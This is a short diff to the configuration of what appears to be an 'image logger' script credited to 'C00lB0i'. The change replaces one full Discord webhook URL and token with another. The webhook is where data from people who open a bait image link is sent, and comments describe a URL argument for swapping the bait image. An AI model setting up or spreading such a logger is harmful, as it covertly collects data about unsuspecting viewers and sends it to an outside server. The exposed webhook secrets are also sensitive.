@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1380939762684395641/J2keB8UZkmZZ42jstL3lPUwJgd2R9KNPoe72tjyDv2E0m7ggHF8zmduXPUYqb_2JK8Z5",
+    "webhook": "https://discord.com/api/webhooks/1381185974570192937/IZM4MLLSzNTnyLh7j7KqWqFiSvHzTQuLmYEjB7a42CbdirzSHq2JDDe1pxyEiKgAccr7",
     "image": "https://c.tenor.com/bN2IkZ5vzxIAAAAd/tenor.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
